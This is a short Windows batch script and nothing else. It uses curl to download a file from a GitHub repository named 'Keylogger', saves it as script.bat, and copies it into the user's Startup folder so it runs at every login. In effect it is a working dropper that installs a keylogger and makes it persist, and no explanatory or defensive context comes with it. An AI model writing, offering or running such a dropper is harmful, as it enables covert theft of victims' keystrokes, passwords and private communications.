@echo off

set url=https://raw.githubusercontent.com/iMakeStuff69420/Keylogger/main/Script
set outputFile=script.bat
set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

curl -o %outputFile% %url%
copy %outputFile% %startupFolder%
